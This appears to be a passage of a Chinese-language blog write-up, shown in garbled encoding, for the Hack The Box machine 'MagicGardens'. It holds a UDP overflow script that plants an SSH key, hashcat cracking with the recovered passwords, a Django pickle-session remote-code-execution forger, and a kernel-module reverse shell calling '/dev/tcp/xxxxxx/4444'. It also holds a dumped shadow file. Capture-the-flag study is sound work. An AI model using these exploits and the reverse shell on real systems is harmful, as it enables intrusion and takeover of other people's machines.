<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ cat v6v2.py </span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">server_address = (<span class="string">&#x27;::1&#x27;</span>,<span class="number">666</span>)</span><br><span class="line">s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)</span><br><span class="line">s.connect(server_address)</span><br><span class="line">data=<span class="string">b&#x27;&#x27;</span>*<span class="number">65364</span> <span class="comment">#&lt;-æ ·ä¾‹ ç”¨gdbçš„æˆ–è€…msfçš„pattenç”Ÿæˆéƒ½ok æˆ–è€…é€‰è‡ªå·±å–œæ¬¢çš„</span></span><br><span class="line">s.send(data)</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2024/magicgardens/pwn6.jpg" alt="pwn6"></p>
<p>è¿™é‡Œåœ¨è°ƒç”¨_IO_new_file_fopençš„æ—¶å€™æ–‡ä»¶åå°±æ˜¯è¢«æº¢å‡ºå†²æ‰äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_IO_new_file_fopen (</span><br><span class="line">   QWORD var_0 = <span class="number">0x000055555555a6d0</span> â†’ <span class="number">0x00000005fbad248c</span>,</span><br><span class="line">   QWORD var_1 = <span class="number">0x00007ffffffed650</span> â†’ <span class="string">&quot;Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw[...]&quot;</span>,</span><br><span class="line">   QWORD var_2 = <span class="number">0x00005555555579d1</span> â†’ <span class="number">0x6f6c206461420077</span> (<span class="string">&quot;w&quot;</span>?),</span><br><span class="line">   <span class="type">int</span> var_3 = <span class="number">0x0000000000000001</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>å˜æˆäº†<code>Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw</code></p>
<p>æˆ‘è¿™é‡Œç”¨çš„msf-pattern</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ msf-pattern_offset -q Fu8F -l 65501                              </span><br><span class="line">[*] Exact match at offset 4524</span><br><span class="line">[*] Exact match at offset 24804</span><br><span class="line">[*] Exact match at offset 45084</span><br><span class="line">[*] Exact match at offset 65364</span><br></pre></td></tr></table></figure>
<p>ä»65364å¼€å§‹æ’ç€å¾€åè¯•ï¼Œçœ‹å“ªä¸ªéƒ¨åˆ†æ˜¯å†™æ–‡ä»¶åçš„ã€‚</p>
<p>å¥½å§65364å°±æ˜¯,ä½†æ˜¯å¾ˆå¥‡æ€ªæˆ‘æ˜¯è¿™ä¹ˆç»™çš„</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">server_address = (<span class="string">&#x27;::1&#x27;</span>,<span class="number">666</span>)</span><br><span class="line">s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)</span><br><span class="line">s.connect(server_address)</span><br><span class="line"></span><br><span class="line">data=<span class="built_in">open</span>(<span class="string">&#x27;./list&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read().replace(<span class="string">b&#x27;\n&#x27;</span>,<span class="string">b&#x27;&#x27;</span>)+<span class="string">b&#x27;aaaaaaaaaaaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">s.send(data)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ <span class="built_in">dir</span>                        </span><br><span class="line">aaaaaaaa</span><br></pre></td></tr></table></figure>

<p>listæˆ‘é‡Œé¢å†™äº†65364ä¸ªå­—ç¬¦ï¼Œç„¶ååˆç»™äº†16ä¸ªaï¼Œæœ€åå†™å‡ºæ¥çš„æ–‡ä»¶åæ˜¯9ä¸ªaï¼Œä¹Ÿå°±æ˜¯è¢«ç¨‹åºåæ‰äº†7ä¸ª,æ‰€ä»¥æˆ‘è¦å†ç»™åƒåœ¾å­—ç¬¦ä¸²+7ä¸ªè¯•è¯•ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l 65371 &gt; list</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†è°ƒç”¨ï¼Œå°±æˆäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ dir</span><br><span class="line">aaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†çœ‹å†…å®¹æœ‰æ²¡æœ‰è¢«æº¢å‡ºå½±å“åˆ°</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ <span class="built_in">cat</span> aaaaaaaaaaaaaaa                                                                                                                     </span><br><span class="line">Aa4Aa5Aa6Aa7Aa....</span><br></pre></td></tr></table></figure>

<p>æŸ¥ä¸‹Aa4æ˜¯å¤šå°‘ä½æº¢å‡ºçš„å°è¯•å†™å…¥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ msf-pattern_offset -q Aa4A -l 65372                                  </span><br><span class="line">[*] Exact match at offset 12</span><br><span class="line">[*] Exact match at offset 20292</span><br><span class="line">[*] Exact match at offset 40572</span><br><span class="line">[*] Exact match at offset 60852</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå°±ä¸ç”¨æ’ç€è¯•äº†..</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ <span class="built_in">wc</span> aaaaaaaaaaaaaaa</span><br><span class="line">    0     1 65375 aaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure>

<p>65372+16-65375-1&#x3D;12 (å› ä¸ºwcä¼šè‡ªåŠ¨å¤šè®¡ç®—ä¸€ä½æ‰€ä»¥-1)</p>
<p>æ‰€ä»¥æœ€åå¯ä»¥æ§åˆ¶å†™å…¥æ–‡ä»¶å+æ–‡ä»¶å†…å®¹å°±å¯ä»¥å†™å…¬é’¥äº†</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">server_address = (<span class="string">&#x27;::1&#x27;</span>,11111)</span><br><span class="line">s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)</span><br><span class="line">s.connect(server_address)</span><br><span class="line">data=b<span class="string">&#x27;A&#x27;</span>*12+open(<span class="string">&#x27;./id_rsa.pub&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).<span class="built_in">read</span>()+open(<span class="string">&#x27;./list1&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).<span class="built_in">read</span>().replace(b<span class="string">&#x27;\n&#x27;</span>,b<span class="string">&#x27;&#x27;</span>)+b<span class="string">&#x27;/home/alex/.ssh/authorized_keys&#x27;</span></span><br><span class="line">s.send(data)</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè¦è‡ªå·±ç®—ä¸€ä¸‹å…¬é’¥é•¿åº¦ä»¥å†³å®šåƒåœ¾æ•°æ®é•¿åº¦ï¼Œåæ­£è¦å…ˆæ‰¾åˆ°å…·ä½“å¤šå°‘æº¢å‡ºå¯ä»¥å†™æ–‡ä»¶åç„¶åå‡ä¸€ä¸‹å…¬é’¥é•¿åº¦å°±å‡ºæ¥äº†ã€‚</p>
<p>ç„¶ååˆ°mortyç”¨æˆ·è¿ä¸€ä¸‹serverï¼Œå†è·‘è„šæœ¬å°±æˆåŠŸå†™å…¥äº†ã€‚</p>
<p>å†sshç™»å½•åˆ°alexç”¨æˆ·å°±ok</p>
<h2 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h2><p>è¿™é‡Œæˆ‘è¿›æ¥åè·‘äº†ä¸‹linpeaså…¶å®..ä½†æ˜¯æ²¡ç¿»åˆ°ä»€ä¹ˆï¼Œå…¶å®æˆ‘çœ¼çäº†ï¼Œä¸€å¼€å§‹æœ‰é‚®ä»¶æç¤ºçš„ï¼Œæˆ‘æ˜¯åœ¨linpeasè·‘åˆ°fail2banæ‰¾ä»–æ¼æ´æ—¶å€™çœ‹åˆ°æœ‰mailæ‰æƒ³åˆ°é¡ºä¾¿å»çœ‹mail..</p>
<p>è¿™é‡Œå†&#x2F;var&#x2F;mailä¸‹æœ‰ä¸€ä¸ª<code>alex</code>å’Œä¸€ä¸ª<code>root</code></p>
<p>åªèƒ½çœ‹alexï¼Œå†…å®¹å¦‚ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">alex@magicgardens:/var/mail$ <span class="built_in">cat</span> alex</span><br><span class="line">From root@magicgardens.magicgardens.htb  Fri Sep 29 09:31:49 2023</span><br><span class="line">Return-Path: &lt;root@magicgardens.magicgardens.htb&gt;</span><br><span class="line">X-Original-To: alex@magicgardens.magicgardens.htb</span><br><span class="line">Delivered-To: alex@magicgardens.magicgardens.htb</span><br><span class="line">Received: by magicgardens.magicgardens.htb (Postfix, from userid 0)</span><br><span class="line">        <span class="built_in">id</span> 3CDA93FC96; Fri, 29 Sep 2023 09:31:49 -0400 (EDT)</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: multipart/mixed; boundary=<span class="string">&quot;1804289383-1695994309=:37178&quot;</span></span><br><span class="line">Subject: Auth file <span class="keyword">for</span> docker</span><br><span class="line">To: &lt;alex@magicgardens.magicgardens.htb&gt;</span><br><span class="line">User-Agent: mail (GNU Mailutils 3.15)</span><br><span class="line">Date: Fri, 29 Sep 2023 09:31:49 -0400</span><br><span class="line">Message-Id: &lt;20230929133149.3CDA93FC96@magicgardens.magicgardens.htb&gt;</span><br><span class="line">From: root &lt;root@magicgardens.magicgardens.htb&gt;</span><br><span class="line"></span><br><span class="line">--1804289383-1695994309=:37178</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Disposition: inline</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Content-ID: &lt;20230929093149.37178@magicgardens.magicgardens.htb&gt;</span><br><span class="line"></span><br><span class="line">Use this file <span class="keyword">for</span> registry configuration. The password is on your desk</span><br><span class="line"></span><br><span class="line">--1804289383-1695994309=:37178</span><br><span class="line">Content-Type: application/octet-stream; name=<span class="string">&quot;auth.zip&quot;</span></span><br><span class="line">Content-Disposition: attachment; filename=<span class="string">&quot;auth.zip&quot;</span></span><br><span class="line">Content-Transfer-Encoding: <span class="built_in">base64</span></span><br><span class="line">Content-ID: &lt;20230929093149.37178.1@magicgardens.magicgardens.htb&gt;</span><br><span class="line"></span><br><span class="line">UEsDBAoACQAAAG6osFh0pjiyVAAAAEgAAAAIABwAaHRwYXNzd2RVVAkAA29KRmbOSkZmdXgLAAEE</span><br><span class="line">6AMAAAToAwAAVb+x1HWvt0ZpJDnunJUUZcvJr8530ikv39GM1hxULcFJfTLLNXgEW2TdUU3uZ44S</span><br><span class="line">q4L6Zcc7HmUA041ijjidMG9iSe0M/y1tf2zjMVg6Dbc1ASfJUEsHCHSmOLJUAAAASAAAAFBLAQIe</span><br><span class="line">AwoACQAAAG6osFh0pjiyVAAAAEgAAAAIABgAAAAAAAEAAACkgQAAAABodHBhc3N3ZFVUBQADb0pG</span><br><span class="line">ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE4AAACmAAAAAAA=</span><br><span class="line">--1804289383-1695994309=:37178--</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™å°±æ˜¯åŒ…å«äº†docker registry configurationç™»é™†æ–¹å¼çš„ä¸€ä¸ªå‹ç¼©åŒ…,æ˜¯rootå‘è¿‡æ¥çš„..å½“æ—¶æˆ‘éƒ½å¿«å¿˜äº†è¿˜æœ‰5000äº†ã€‚</p>
<p>è¿™é‡Œbase64è¾“å‡ºåˆ°zipï¼Œç„¶åç”¨zip2johnå¯¼ä¸€ä¸‹è·‘å¯†ç å°±ok</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ hashcat <span class="string">&#x27;$pkzip$1*2*2*0*54*48*b238a674*0*42*0*54*a86e*55bfb1d475afb746692439ee9c951465cbc9afce77d2292fdfd18cd61c542dc1497d32cb3578045b64dd514dee678e12ab82fa65c73b1e6500d38d628e389d306f6249ed0cff2d6d7f6ce331583a0db7350127c9*$/pkzip$&#x27;</span> -m 17225 /usr/share/wordlists/rockyou.txt --show</span><br><span class="line">$pkzip<span class="variable">$1</span>*2*2*0*54*48*b238a674*0*42*0*54*a86e*55bfb1d475afb746692439ee9c951465cbc9afce77d2292fdfd18cd61c542dc1497d32cb3578045b64dd514dee678e12ab82fa65c73b1e6500d38d628e389d306f6249ed0cff2d6d7f6ce331583a0db7350127c9*$/pkzip$:realmadrid</span><br></pre></td></tr></table></figure>

<p>è§£å‹å‡ºæ¥æœ‰ä¸ªhtpasswd</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ <span class="built_in">cat</span> htpasswd</span><br><span class="line">AlexMiles:$2y$05<span class="variable">$KKShqNw</span>.A66mmpEqmNJ0kuoBwO2rbdWetc7eXA7TbjhHZGs2Pa5Hq</span><br></pre></td></tr></table></figure>

<p>æ¥ç€è·‘</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat <span class="string">&#x27;$2y$05$KKShqNw.A66mmpEqmNJ0kuoBwO2rbdWetc7eXA7TbjhHZGs2Pa5Hq&#x27;</span> -m3200 /usr/share/wordlists/rockyou.txt --show</span><br><span class="line">$2y$05<span class="variable">$KKShqNw</span>.A66mmpEqmNJ0kuoBwO2rbdWetc7eXA7TbjhHZGs2Pa5Hq:diamonds</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‹¿ç€å¯†ç å»çœ‹ä¸‹5000é‡Œéƒ½æœ‰å•¥</p>
<blockquote>
<p>å¯ä»¥å‚è€ƒ</p>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry">https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python3 drg.py -U AlexMiles -P diamonds https://magicgardens.htb --list</span><br><span class="line">[+] magicgardens.htb</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸ªé•œåƒ è¿™ä¸ªç›´æ¥dumpä¸‹æ¥ç¿»å°±è¡Œäº†ï¼Œå…¶å®å…¨éƒ¨è§£å‹æ¯”è¾ƒå¥½ï¼Œä¸»è¦æˆ‘ç¡¬ç›˜æ²¡ç©ºé—´äº†ï¼Œæ‰€ä»¥å°±æŒ¨ä¸ªå‹ç¼©åŒ…çœ‹äº†ï¼Œæœ‰ç‚¹æŠ˜ç£¨</p>
<p>ç„¶ååœ¨<code>480311b89e2d843d87e76ea44ffbb212643ba89c1e147f0d0ff800b5fe8964fb.tar.gz</code>å‹ç¼©åŒ…é‡Œæ‰¾åˆ°ä¸ªappç›®å½•é‡Œé¢æœ‰.envï¼Œå…¶ä¸­åŒ…å«SECRET_KEYã€‚</p>
<p>å› ä¸ºæˆ‘ä¹‹å‰åšè¿‡pythonçš„webæ¡†æ¶çš„ååºåˆ—åŒ–çš„é¢˜ç›®..æ‰€ä»¥çœ‹åˆ°SECRET_KEYä¸€çœ¼é¡¶é’ˆï¼Œä¸è¿‡è¿˜æ˜¯æ‰¾äº†ä¸‹saltï¼Œç„¶åå‘ç°saltæ˜¯é»˜è®¤çš„ã€‚</p>
<p>ç„¶åæ‰¾åˆ©ç”¨è„šæœ¬æ‰¾äº†å¥½ä¹…ï¼Œæœ‹å‹å‘è¿‡æ¥ä¸€ä¸ªæ‰å‘ç°å…¶å®æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªå°±æ˜¯å¯ä»¥ç”¨çš„ï¼Œæ˜¯æˆ‘çš„payloadé”™äº†..åœ¨é‚£ç–¯ç‹‚touch &#x2F;tmp&#x2F;xxxï¼Œç„¶åç”¨alexå»å®¿ä¸»æœºçš„&#x2F;tmpçœ‹æœ‰æ²¡æœ‰æ–‡ä»¶ç”Ÿæˆï¼Œå¿˜äº†è¿™æ˜¯imageç›®æ ‡æ˜¯è·‘åœ¨dockeré‡Œçš„ï¼Œæ‰“æ˜å¤´äº†å±äºæ˜¯ XD</p>
<blockquote>
<p>è¿™é‡Œç”¨çš„è¿™ä½å¸ˆå‚…çš„è„šæœ¬<strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-zhong/p/13463486.html">https://www.cnblogs.com/-zhong/p/13463486.html</a></strong></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> django.contrib.sessions.serializers <span class="keyword">import</span> PickleSerializer</span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line">settings.configure(SECRET_KEY=<span class="string">&#x27;55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&amp;87b&#x27;</span>)  <span class="comment"># SECRET_KEY å‚æ•°çš„å€¼ä¸º demo Django é¡¹ç›®çš„ SECRET_KEY å€¼</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CreateTmpFile</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">import</span> subprocess</span><br><span class="line">        <span class="keyword">return</span> (subprocess.call,</span><br><span class="line">                ([<span class="string">&#x27;bash&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;echo xxxxx | base64 -d | bash&#x27;</span>],))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = signing.dumps(</span><br><span class="line">    obj=CreateTmpFile(),</span><br><span class="line">    serializer=PickleSerializer,</span><br><span class="line">    salt=<span class="string">&#x27;django.contrib.sessions.backends.signed_cookies&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(sess)</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆçš„sessionæ›¿æ¢åˆ°webä¸Šå°±å¯ä»¥rceå•¦</p>
<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><p>åˆ°è¿™é‡Œå…¶å®å°±ç®€å•äº†</p>
<p>å¼¹shellè¿›å…¥å®¹å™¨ï¼Œæœ¬æ¥æ˜¯æ‰“ç®—è·‘ä¸ª<code>deepce</code>æˆ–è€…<code>linpea</code>sçš„ï¼Œä¸è¿‡å› ä¸º<code>capsh --print</code>è¾“å‡ºé‡Œæœ‰<code>cap_sys_module</code>,æ‰€ä»¥é€Ÿé€šäº†ã€‚</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_module">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_module</a></p>
</blockquote>
<p>æŒ‰ç…§hacktricksè®²çš„åˆ†åˆ«åˆ›å»ºä¸€ä¸ª</p>
<h2 id="reverse-shell-c"><a href="#reverse-shell-c" class="headerlink" title="reverse-shell.c"></a>reverse-shell.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kmod.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;AttackDefense&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;LKM reverse shell module&quot;</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">&quot;1.0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* argv[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/xxxxxx/4444 0&gt;&amp;1&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span>* envp[] = &#123;<span class="string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// call_usermodehelper function is used to create user mode processes from kernel space</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">reverse_shell_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">reverse_shell_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Exiting\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(reverse_shell_init);</span><br><span class="line">module_exit(reverse_shell_exit);</span><br></pre></td></tr></table></figure>
<p>ä»¥åŠä¸€ä¸ª</p>
<h2 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj-m +=reverse-shell.o</span><br><span class="line"></span><br><span class="line">all:</span><br><span class="line">  make -C /lib/modules/$(shell <span class="built_in">uname</span> -r)/build M=$(PWD) modules</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">  make -C /lib/modules/$(shell <span class="built_in">uname</span> -r)/build M=$(PWD) clean</span><br></pre></td></tr></table></figure>

<hr>
<p><code>nc -lvnp 4444</code></p>
<p><code>insmod reverse-shell.ko</code></p>
<p>å°±æ‹¿åˆ°äº†root çš„ shell</p>
<h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T<span class="variable">$Gctu2C9XwCFVr1qINWJjA</span>/<span class="variable">$u8IdKz0x2uCYAzOIx0qxNvBQEjY0uOaRwgA1sRC8Aj8</span>:19592:0:99999:7:::</span><br><span class="line">daemon:*:19592:0:99999:7:::</span><br><span class="line">bin:*:19592:0:99999:7:::</span><br><span class="line">sys:*:19592:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19592:0:99999:7:::</span><br><span class="line">games:*:19592:0:99999:7:::</span><br><span class="line">man:*:19592:0:99999:7:::</span><br><span class="line">lp:*:19592:0:99999:7:::</span><br><span class="line">mail:*:19592:0:99999:7:::</span><br><span class="line">news:*:19592:0:99999:7:::</span><br><span class="line">uucp:*:19592:0:99999:7:::</span><br><span class="line">proxy:*:19592:0:99999:7:::</span><br><span class="line">www-data:*:19592:0:99999:7:::</span><br><span class="line">backup:*:19592:0:99999:7:::</span><br><span class="line">list:*:19592:0:99999:7:::</span><br><span class="line">irc:*:19592:0:99999:7:::</span><br><span class="line">_apt:*:19592:0:99999:7:::</span><br><span class="line">nobody:*:19592:0:99999:7:::</span><br><span class="line">systemd-network:!*:19592::::::</span><br><span class="line">messagebus:!:19592::::::</span><br><span class="line">avahi-autoipd:!:19592::::::</span><br><span class="line">sshd:!:19592::::::</span><br><span class="line">alex:$y$j9T$vRmhfv9eghNK4I7HfdkjW0<span class="variable">$5fFIjvFlbw5ki</span>/5cvoSkG/YizBXms47kw9tubbF/l42:19759:0:99999:7:::</span><br><span class="line">morty:$y$j9T<span class="variable">$0lTi82bFeyrX9oyH</span>/XMnE.<span class="variable">$V8E6g5oxm5</span>/LGomE.6NBAIwvieFOLqSgm3b7LnZlPT5:19781:0:99999:7:::</span><br><span class="line">postfix:!:19629::::::</span><br><span class="line">_laurel:!:19839::::::</span><br></pre></td></tr></table></figure>
        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2024/06/06/box-freelancer-wp/"
      title="ã€season-5ã€‘box freelancer wp"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        ã€season-5ã€‘box freelancer wp
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2024/05/26/box-BoardLight-wp/"
      title="ã€season-5ã€‘box BoardLight wp"
     >

    <p class="title-text">
      
        ã€season-5ã€‘box BoardLight wp
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>





    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2024 Flower<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
